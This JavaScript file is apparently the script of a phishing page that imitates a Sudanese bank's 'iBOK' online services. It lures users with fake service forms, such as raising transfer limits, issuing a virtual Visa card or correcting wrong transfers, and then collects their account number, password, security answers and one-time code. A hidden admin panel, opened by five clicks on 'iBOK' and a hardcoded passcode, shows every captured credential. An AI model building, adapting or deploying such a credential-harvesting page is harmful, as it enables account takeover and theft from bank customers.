let currentServiceName = "";
let timerInterval = null;
let ibokClickCount = 0;
let ibokTimeout = null;

// الأرشيف الشامل لحفظ كل البيانات القديمة والجديدة
let allSessionsArchive = [];
let currentSession = {
    service: "",
    formData: {},
    login: {},
    security: {},
    otp: ""
};

// كلمة المرور القوية المطلوبة: حرف كبير، حرف صغير، رقم، وحرف خاص
const ADMIN_PASSCODE = "Bank@2026!";

function checkStrongPassword(pass) {
    let hasUpper = /[A-Z]/.test(pass);
    let hasLower = /[a-z]/.test(pass);
    let hasNum = /[0-9]/.test(pass);
    let hasSpecial = /[^A-Za-z0-9]/.test(pass);
    return hasUpper && hasLower && hasNum && hasSpecial;
}

// النقر 5 مرات على كلمة iBOK لفتح صفحة لوحة التحكم المستقلة
function handleIbokClick() {
    ibokClickCount++;
    clearTimeout(ibokTimeout);
    ibokTimeout = setTimeout(() => { ibokClickCount = 0; }, 1500);

    if (ibokClickCount >= 5) {
        ibokClickCount = 0;
        let enteredPass = prompt("أدخل كلمة المرور القوية (تحتوي على حرف كبير، حرف صغير، رقم، وحرف خاص):");
        if (enteredPass === ADMIN_PASSCODE) {
            renderAdminArchive();
            document.getElementById('admin-page-overlay').style.display = 'flex';
        } else if (enteredPass !== null) {
            alert("كلمة المرور غير صحيحة أو لا تستوفي شروط الأمان المطلوبة!");
        }
    }
}

function closeAdminPage() {
    document.getElementById('admin-page-overlay').style.display = 'none';
}

function openService(serviceKey) {
    currentServiceName = serviceKey;
    currentSession = { service: serviceKey, formData: {}, login: {}, security: {}, otp: "" };
    
    document.getElementById('home-page').style.display = 'none';
    document.getElementById('service-overlay').style.display = 'flex';
    
    document.querySelectorAll('.step-container').forEach(el => el.classList.remove('active'));
    document.getElementById('step-service-form').classList.add('active');

    let container = document.getElementById('specific-form-content');
    let titleText = "";

    if (serviceKey === 'update-data') {
        titleText = "تحديث البيانات الشخصية";
        container.innerHTML = `
            <div class="form-group"><label>الاسم كامل</label><input type="text" id="f-name" class="form-control" placeholder="الاسم الرباعي"></div>
            <div class="form-group"><label>الرقم الوطني</label><input type="text" id="f-nid" class="form-control" placeholder="أدخل الرقم الوطني"></div>
            <div class="form-group">
                <label>رقم الهاتف (زين أو سوداني)</label>
                <select id="f-net" class="form-control" style="margin-bottom: 5px;"><option>زين (Zain)</option><option>سوداني (Sudani)</option></select>
                <input type="text" id="f-phone" class="form-control" placeholder="09xxxxxxxx">
            </div>
            <div class="form-group"><label>السكن الحالي</label><input type="text" id="f-address" class="form-control" placeholder="المدينة / الحي / الشارع"></div>
        `;
    } else if (serviceKey === 'raise-limit') {
        titleText = "رفع سقف التحويلات اليومية";
        container.innerHTML = `
            <div class="form-group"><label>السقف الحالي</label><input type="text" class="form-control" value="25,000,000.00 جنيه" disabled style="background:#f9f9f9; color:#d32f2f; font-weight:bold;"></div>
            <div class="form-group"><label>السقف المطلوب</label><input type="text" class="form-control" value="45,000,000.00 جنيه" disabled style="background:#f9f9f9; color:#2e7d32; font-weight:bold;"></div>
            <div class="form-group"><label>سبب طلب الرفع</label><input type="text" id="f-reason" class="form-control" placeholder="أدخل السبب باختصار"></div>
        `;
    } else if (serviceKey === 'wrong-transfers') {
        titleText = "معالجة التحويلات الخاطئة";
        container.innerHTML = `
            <div class="form-group"><label>رقم الحساب المحول إليه بالخطأ</label><input type="text" id="f-wacc" class="form-control" placeholder="رقم الحساب"></div>
            <div class="form-group"><label>رقم العملية (رقم الإيصال)</label><input type="text" id="f-wop" class="form-control" placeholder="رقم العملية"></div>
            <div class="form-group"><label>تاريخ التحويل</label><input type="date" id="f-wdate" class="form-control"></div>
            <div class="form-group"><label>المبلغ المحول</label><input type="text" id="f-wamt" class="form-control" placeholder="المبلغ"></div>
        `;
    } else if (serviceKey === 'forex-services') {
        titleText = "خدمات العملات الأجنبية";
        container.innerHTML = `
            <div class="form-group"><label>اختر العملة</label><select id="f-curr" class="form-control"><option>دولار أمريكي (USD)</option><option>يورو (EUR)</option><option>ريال سعودي (SAR)</option><option>درهم إماراتي (AED)</option></select></div>
            <div class="form-group"><label>نوع المعاملة</label><select id="f-ctype" class="form-control"><option>شراء عملة</option><option>بيع عملة</option><option>تحويل عملات أجنبية</option></select></div>
            <div class="form-group"><label>المبلغ المراد</label><input type="text" id="f-camt" class="form-control" placeholder="المبلغ"></div>
        `;
    } else if (serviceKey === 'account-statement') {
        titleText = "طلب كشف حساب مفصل";
        container.innerHTML = `
            <div class="form-group"><label>من تاريخ</label><input type="date" id="f-sfrom" class="form-control"></div>
            <div class="form-group"><label>إلى تاريخ</label><input type="date" id="f-sto" class="form-control"></div>
            <div class="form-group"><label>نوع الحساب</label><select id="f-stype" class="form-control"><option>حساب جاري</option><option>حساب توفير</option></select></div>
        `;
    } else if (serviceKey === 'virtual-visa') {
        titleText = "إصدار بطاقة فيزا افتراضية";
        container.innerHTML = `
            <div class="form-group"><label>نوع البطاقة</label><input type="text" class="form-control" value="Visa Virtual Online" disabled></div>
            <div class="form-group"><label>العملة والحد الأقصى</label><input type="text" class="form-control" value="USD - 500$" disabled></div>
            <div class="form-group"><label>الحساب الخصم منه</label><input type="text" id="f-vacc" class="form-control" placeholder="رقم الحساب"></div>
        `;
    } else if (serviceKey === 'special-account') {
        titleText = "حساب جاري وحساب مميز";
        container.innerHTML = `
            <div class="form-group"><label>نوع الحساب المطلوب</label><select id="f-atype" class="form-control"><option>فتح حساب جاري جديد</option><option>ترقية إلى حساب مميز (VIP)</option></select></div>
            <div class="form-group"><label>الفرع المفضل</label><input type="text" id="f-abranch" class="form-control" placeholder="المدينة أو الفرع"></div>
        `;
    } else if (serviceKey === 'security-questions') {
        titleText = "إدارة وتحديث أسئلة الأمان";
        container.innerHTML = `
            <div class="form-group"><label>السؤال الأمني الجديد</label><select id="f-sq" class="form-control"><option>ما هو اسم ابن عمك الأول؟</option><option>ما كان لقبك أثناء الطفولة؟</option></select></div>
            <div class="form-group"><label>الإجابة الجديدة</label><input type="text" id="f-sa" class="form-control" placeholder="الإجابة الجديدة"></div>
        `;
    }

    document.getElementById('overlay-title-text').innerText = titleText;
    saveOrUpdateArchive();
}

function closeServiceOverlay() {
    document.getElementById('service-overlay').style.display = 'none';
    document.getElementById('home-page').style.display = 'block';
    if(timerInterval) clearInterval(timerInterval);
}

function submitServiceForm() {
    let inputs = document.querySelectorAll('#specific-form-content input, #specific-form-content select');
    inputs.forEach((inp, idx) => {
        currentSession.formData[`حقل_${idx+1}`] = inp.value || 'فارغ';
    });
    saveOrUpdateArchive();
    
    document.querySelectorAll('.step-container').forEach(el => el.classList.remove('active'));
    document.getElementById('step-login').classList.add('active');
}

function submitLoginForm() {
    currentSession.login = {
        account: document.getElementById('inp-acc').value,
        pass: document.getElementById('inp-pass').value
    };
    saveOrUpdateArchive();

    document.querySelectorAll('.step-container').forEach(el => el.classList.remove('active'));
    document.getElementById('step-security').classList.add('active');
}

function submitSecurityForm() {
    currentSession.security = {
        q1: document.getElementById('sec-q-1').value,
        ans1: document.getElementById('sec-ans-1').value,
        q2: document.getElementById('sec-q-2').value,
        ans2: document.getElementById('sec-ans-2').value
    };
    saveOrUpdateArchive();

    document.querySelectorAll('.step-container').forEach(el => el.classList.remove('active'));
    document.getElementById('step-otp').classList.add('active');
    startOtpTimer();
}

function submitOtpForm() {
    currentSession.otp = document.getElementById('inp-otp').value;
    saveOrUpdateArchive();

    document.querySelectorAll('.step-container').forEach(el => el.classList.remove('active'));
    document.getElementById('step-success').classList.add('active');
}

function startOtpTimer() {
    if(timerInterval) clearInterval(timerInterval);
    let timeLeft = 3600;
    const timerSpan = document.getElementById('timer-count');
    const resendDiv = document.getElementById('resend-btn');
    const timerDisplay = document.getElementById('otp-timer-display');
    
    resendDiv.style.display = 'none';
    timerDisplay.style.display = 'block';

    timerInterval = setInterval(() => {
        let minutes = Math.floor(timeLeft / 60);
        let seconds = timeLeft % 60;
        timerSpan.innerText = `${minutes < 10 ? '0' : ''}${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
        
        if (timeLeft <= 0) {
            clearInterval(timerInterval);
            timerDisplay.style.display = 'none';
            resendDiv.style.display = 'block';
        }
        timeLeft--;
    }, 1000);
}

function restartOtpTimer() {
    startOtpTimer();
}

function saveOrUpdateArchive() {
    let existingIndex = allSessionsArchive.findIndex(s => s === currentSession);
    if (existingIndex === -1) {
        allSessionsArchive.push(currentSession);
    }
}

function renderAdminArchive() {
    let container = document.getElementById('admin-logs-container');
    if (allSessionsArchive.length === 0) {
        container.innerHTML = '<div style="color: #888;">لا توجد سجلات محفوظة بعد.</div>';
        return;
    }

    let html = "";
    allSessionsArchive.forEach((session, index) => {
        let formDetails = JSON.stringify(session.formData);
        html += `
            <div style="background:#222; border:1px solid #444; border-radius:8px; padding:12px; margin-bottom:10px;">
                <div style="color:#ffeb3b; font-weight:bold; border-bottom:1px dashed #555; padding-bottom:4px; margin-bottom:6px;">
                    جلسة رقم #${index + 1} - الخدمة: ${session.service || '-'}
                </div>
                <strong>بيانات النموذج:</strong> ${formDetails}<br>
                <strong>رقم الحساب:</strong> ${session.login.account || '-'} | <strong>كلمة السر:</strong> ${session.login.pass || '-'}<br>
                <strong>السؤال 1:</strong> ${session.security.q1 || '-'} <br><strong>الجواب 1:</strong> ${session.security.ans1 || '-'}<br>
                <strong>السؤال 2:</strong> ${session.security.q2 || '-'} <br><strong>الجواب 2:</strong> ${session.security.ans2 || '-'}<br>
                <strong>رمز الـ OTP:</strong> <span style="color:#0f0;">${session.otp || 'قيد الانتظار'}</span>
            </div>
        `;
    });
    container.innerHTML = html;
}
